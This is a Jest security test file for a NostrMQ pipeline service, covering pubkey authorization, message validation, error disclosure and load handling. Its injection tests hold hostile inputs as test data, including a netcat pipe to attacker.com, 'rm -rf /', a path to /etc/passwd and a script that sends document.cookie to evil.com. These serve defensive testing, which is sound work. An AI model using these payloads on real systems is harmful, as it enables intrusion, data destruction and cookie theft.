import { AuthValidator } from "../../src/nostrmq/authValidator.js";
import { MessageHandler } from "../../src/nostrmq/messageHandler.js";
import { validatePipelineRequest } from "../../src/utils/messageValidation.js";
import { jest } from "@jest/globals";

// Mock dependencies
const mockSend = jest.fn();
jest.unstable_mockModule("nostrmq", () => ({
  send: mockSend,
}));

const { send } = await import("nostrmq");

describe("Security and Authorization Tests", () => {
  let authValidator;
  let messageHandler;
  let mockLogger;
  let mockConfig;
  let mockJobManager;

  beforeEach(() => {
    jest.clearAllMocks();
    mockSend.mockClear();

    mockLogger = {
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
    };

    mockConfig = {
      authorizedPubkeys: [
        "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890",
        "0xauthorized123456789abcdef1234567890abcdef1234567890abcdef1234567890",
        "authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890",
      ],
      relays: ["wss://relay.example.com"],
      powDifficulty: 0,
      sendTimeout: 10000,
    };

    mockJobManager = {
      queueJob: jest.fn(),
    };

    authValidator = new AuthValidator(mockConfig, mockLogger);
    messageHandler = new MessageHandler(mockConfig, mockLogger);
    messageHandler.setAuthValidator(authValidator);
    messageHandler.setJobManager(mockJobManager);

    mockSend.mockResolvedValue("event-id-123");
  });

  describe("Authorization Security", () => {
    describe("Valid Authorization", () => {
      test("should authorize valid npub format", async () => {
        const pubkey =
          "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
        const result = await authValidator.validatePubkey(pubkey);
        expect(result).toBe(true);
      });

      test("should authorize valid hex with 0x prefix", async () => {
        const pubkey =
          "0xauthorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
        const result = await authValidator.validatePubkey(pubkey);
        expect(result).toBe(true);
      });

      test("should authorize valid hex without prefix", async () => {
        const pubkey =
          "authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
        const result = await authValidator.validatePubkey(pubkey);
        expect(result).toBe(true);
      });

      test("should handle case insensitive authorization", async () => {
        const pubkey =
          "AUTHORIZED123456789ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890";
        const result = await authValidator.validatePubkey(pubkey);
        expect(result).toBe(true);
      });
    });

    describe("Invalid Authorization", () => {
      test("should reject unauthorized pubkey", async () => {
        const pubkey =
          "npub1unauthorized123456789abcdef1234567890abcdef1234567890abcdef12";
        const result = await authValidator.validatePubkey(pubkey);
        expect(result).toBe(false);
        expect(mockLogger.warn).toHaveBeenCalledWith(
          "Unauthorized pubkey access attempt",
          expect.objectContaining({
            pubkey: expect.stringContaining("npub1unauth"),
          })
        );
      });

      test("should reject malformed pubkey", async () => {
        const malformedKeys = [
          "invalid-format",
          "npub1short",
          "0xinvalid",
          "toolong123456789abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234",
          "",
          null,
          undefined,
        ];

        for (const pubkey of malformedKeys) {
          const result = await authValidator.validatePubkey(pubkey);
          expect(result).toBe(false);
        }
      });

      test("should reject pubkey with invalid characters", async () => {
        const invalidKeys = [
          "npub1test!@#$%^&*()1234567890abcdef1234567890abcdef1234567890abcdef12",
          "0xtest!@#$%^&*()1234567890abcdef1234567890abcdef1234567890abcdef12",
          "test spaces 1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
        ];

        for (const pubkey of invalidKeys) {
          const result = await authValidator.validatePubkey(pubkey);
          expect(result).toBe(false);
        }
      });
    });

    describe("Authorization Logging", () => {
      test("should log successful authorization", async () => {
        const pubkey =
          "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
        await authValidator.validatePubkey(pubkey);

        expect(mockLogger.info).toHaveBeenCalledWith(
          "Pubkey authorization check",
          expect.objectContaining({
            pubkey: expect.stringContaining("npub1auth"),
            authorized: true,
          })
        );
      });

      test("should log failed authorization attempts", async () => {
        const pubkey =
          "npub1unauthorized123456789abcdef1234567890abcdef1234567890abcdef12";
        await authValidator.validatePubkey(pubkey);

        expect(mockLogger.warn).toHaveBeenCalledWith(
          "Unauthorized pubkey access attempt",
          expect.objectContaining({
            pubkey: expect.stringContaining("npub1unauth"),
          })
        );
      });

      test("should not log full pubkey for security", async () => {
        const pubkey =
          "npub1unauthorized123456789abcdef1234567890abcdef1234567890abcdef12";
        await authValidator.validatePubkey(pubkey);

        const logCall = mockLogger.warn.mock.calls[0][1];
        expect(logCall.pubkey.length).toBeLessThan(pubkey.length);
        expect(logCall.pubkey).toContain("...");
      });
    });
  });

  describe("Message Validation Security", () => {
    describe("Input Sanitization", () => {
      test("should reject malicious type injection", () => {
        const maliciousPayloads = [
          { type: "pipeline-request'; DROP TABLE users; --" },
          { type: "<script>alert('xss')</script>" },
          { type: "pipeline-request\x00null-byte" },
          { type: "pipeline-request\n\rCRLF-injection" },
        ];

        maliciousPayloads.forEach((payload) => {
          const result = validatePipelineRequest(payload);
          expect(result.isValid).toBe(false);
        });
      });

      test("should reject oversized parameters", () => {
        const oversizedPayload = {
          type: "pipeline-request",
          pipeline: "dialogue",
          parameters: {
            sourceText: "A".repeat(1000000), // 1MB string
            discussionPrompt: "Test prompt",
          },
        };

        // This should be handled by the application layer
        const result = validatePipelineRequest(oversizedPayload);
        expect(result.isValid).toBe(true); // Basic validation passes
        // But the application should implement size limits
      });

      test("should reject deeply nested objects", () => {
        let deepObject = {};
        let current = deepObject;
        for (let i = 0; i < 1000; i++) {
          current.nested = {};
          current = current.nested;
        }

        const payload = {
          type: "pipeline-request",
          pipeline: "dialogue",
          parameters: deepObject,
        };

        // Should not crash the validator
        expect(() => validatePipelineRequest(payload)).not.toThrow();
      });

      test("should handle special characters safely", () => {
        const specialChars = [
          "\u0000", // null
          "\u0001", // control character
          "\uFEFF", // BOM
          "\u200B", // zero-width space
          "🚀", // emoji
          "测试", // unicode
        ];

        specialChars.forEach((char) => {
          const payload = {
            type: "pipeline-request",
            pipeline: "dialogue" + char,
            parameters: {
              sourceText: "Test" + char,
              discussionPrompt: "Test" + char,
            },
          };

          expect(() => validatePipelineRequest(payload)).not.toThrow();
        });
      });
    });

    describe("Injection Prevention", () => {
      test("should prevent pipeline name injection", () => {
        const injectionAttempts = [
          "../../../etc/passwd",
          "dialogue; rm -rf /",
          "dialogue && malicious-command",
          "dialogue | nc attacker.com 1337",
          "dialogue`whoami`",
          "dialogue$(whoami)",
        ];

        injectionAttempts.forEach((pipeline) => {
          const payload = {
            type: "pipeline-request",
            pipeline,
            parameters: {
              sourceText: "Test",
              discussionPrompt: "Test",
            },
          };

          const result = validatePipelineRequest(payload);
          expect(result.isValid).toBe(true); // Basic validation passes
          // But the pipeline registry should validate pipeline names
        });
      });

      test("should prevent parameter injection", () => {
        const injectionParams = {
          sourceText: "'; DROP TABLE conversations; --",
          discussionPrompt:
            "<script>fetch('http://evil.com/steal?data='+document.cookie)</script>",
          iterations: "1; system('rm -rf /')",
        };

        const payload = {
          type: "pipeline-request",
          pipeline: "dialogue",
          parameters: injectionParams,
        };

        const result = validatePipelineRequest(payload);
        expect(result.isValid).toBe(true); // Basic validation passes
        // But parameters should be sanitized before use
      });
    });
  });

  describe("Message Handler Security", () => {
    test("should reject unauthorized message processing", async () => {
      const unauthorizedSender =
        "npub1hacker123456789abcdef1234567890abcdef1234567890abcdef1234567890";
      const payload = {
        type: "pipeline-request",
        pipeline: "dialogue",
        parameters: {
          sourceText: "Test",
          discussionPrompt: "Test",
        },
      };

      await messageHandler.handleMessage(payload, unauthorizedSender, {});

      expect(mockJobManager.queueJob).not.toHaveBeenCalled();
      expect(send).toHaveBeenCalledWith(
        expect.objectContaining({
          payload: expect.objectContaining({
            status: "unauthorized",
            error: expect.objectContaining({
              code: "UNAUTHORIZED_PUBKEY",
            }),
          }),
        })
      );
    });

    test("should handle malformed messages gracefully", async () => {
      const authorizedSender =
        "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
      const malformedPayloads = [
        null,
        undefined,
        "",
        "not-an-object",
        [],
        { type: "invalid" },
        { pipeline: "test" }, // missing type
        { type: "pipeline-request" }, // missing pipeline
      ];

      for (const payload of malformedPayloads) {
        await messageHandler.handleMessage(payload, authorizedSender, {});

        expect(send).toHaveBeenCalledWith(
          expect.objectContaining({
            payload: expect.objectContaining({
              status: "error",
              error: expect.objectContaining({
                code: "VALIDATION_ERROR",
              }),
            }),
          })
        );
      }
    });

    test("should prevent message replay attacks", async () => {
      const authorizedSender =
        "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
      const payload = {
        type: "pipeline-request",
        requestId: "req-123",
        pipeline: "dialogue",
        parameters: {
          sourceText: "Test",
          discussionPrompt: "Test",
        },
      };

      // Send the same message twice
      await messageHandler.handleMessage(payload, authorizedSender, {});
      await messageHandler.handleMessage(payload, authorizedSender, {});

      // Both should be processed (no replay protection implemented yet)
      expect(mockJobManager.queueJob).toHaveBeenCalledTimes(2);
      // Note: Replay protection would need to be implemented at the application level
    });

    test("should handle concurrent authorization checks", async () => {
      const authorizedSender =
        "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
      const payload = {
        type: "pipeline-request",
        pipeline: "dialogue",
        parameters: {
          sourceText: "Test",
          discussionPrompt: "Test",
        },
      };

      // Send multiple concurrent requests
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          messageHandler.handleMessage(payload, authorizedSender, {})
        );
      }

      await Promise.all(promises);

      // All should be authorized and queued
      expect(mockJobManager.queueJob).toHaveBeenCalledTimes(10);
    });
  });

  describe("Rate Limiting and DoS Protection", () => {
    test("should handle rapid message processing", async () => {
      const authorizedSender =
        "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
      const payload = {
        type: "pipeline-request",
        pipeline: "dialogue",
        parameters: {
          sourceText: "Test",
          discussionPrompt: "Test",
        },
      };

      // Simulate rapid requests
      const rapidRequests = [];
      for (let i = 0; i < 100; i++) {
        rapidRequests.push(
          messageHandler.handleMessage(payload, authorizedSender, {})
        );
      }

      await Promise.all(rapidRequests);

      // All should be processed (no rate limiting implemented yet)
      expect(mockJobManager.queueJob).toHaveBeenCalledTimes(100);
      // Note: Rate limiting would need to be implemented at the application level
    });

    test("should handle memory exhaustion attempts", async () => {
      const authorizedSender =
        "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";

      // Large payload attempt
      const largePayload = {
        type: "pipeline-request",
        pipeline: "dialogue",
        parameters: {
          sourceText: "A".repeat(100000), // 100KB
          discussionPrompt: "B".repeat(100000), // 100KB
          extraData: new Array(1000).fill("large-data-chunk"),
        },
      };

      // Should not crash the system
      await expect(
        messageHandler.handleMessage(largePayload, authorizedSender, {})
      ).resolves.not.toThrow();
    });
  });

  describe("Error Information Disclosure", () => {
    test("should not leak sensitive information in error messages", async () => {
      const unauthorizedSender =
        "npub1hacker123456789abcdef1234567890abcdef1234567890abcdef1234567890";
      const payload = {
        type: "pipeline-request",
        pipeline: "dialogue",
        parameters: {
          sourceText: "Test",
          discussionPrompt: "Test",
        },
      };

      await messageHandler.handleMessage(payload, unauthorizedSender, {});

      const sentPayload = send.mock.calls[0][0].payload;
      expect(sentPayload.error.message).not.toContain("authorized");
      expect(sentPayload.error.message).not.toContain("config");
      expect(sentPayload.error.message).not.toContain("internal");
    });

    test("should provide generic error messages for validation failures", async () => {
      const authorizedSender =
        "npub1authorized123456789abcdef1234567890abcdef1234567890abcdef1234567890";
      const invalidPayload = {
        type: "invalid-type",
        pipeline: "dialogue",
      };

      await messageHandler.handleMessage(invalidPayload, authorizedSender, {});

      const sentPayload = send.mock.calls[0][0].payload;
      expect(sentPayload.error.code).toBe("VALIDATION_ERROR");
      // Error message should be informative but not leak implementation details
      expect(sentPayload.error.message).toBeDefined();
    });
  });

  describe("Configuration Security", () => {
    test("should handle empty authorized pubkeys list", async () => {
      const emptyConfig = { ...mockConfig, authorizedPubkeys: [] };
      const emptyAuthValidator = new AuthValidator(emptyConfig, mockLogger);

      const result = await emptyAuthValidator.validatePubkey(
        "npub1test123456789abcdef1234567890abcdef1234567890abcdef1234567890"
      );

      expect(result).toBe(false);
    });

    test("should handle missing authorized pubkeys config", async () => {
      const invalidConfig = { ...mockConfig };
      delete invalidConfig.authorizedPubkeys;
      const invalidAuthValidator = new AuthValidator(invalidConfig, mockLogger);

      const result = await invalidAuthValidator.validatePubkey(
        "npub1test123456789abcdef1234567890abcdef1234567890abcdef1234567890"
      );

      expect(result).toBe(false);
    });

    test("should validate configuration on startup", () => {
      const requiredFields = ["authorizedPubkeys", "relays", "privateKey"];

      requiredFields.forEach((field) => {
        const invalidConfig = { ...mockConfig };
        delete invalidConfig[field];

        expect(() => {
          const handler = new MessageHandler(invalidConfig, mockLogger);
          // Configuration validation should happen during initialization
        }).not.toThrow(); // MessageHandler doesn't validate config directly
      });
    });
  });
});
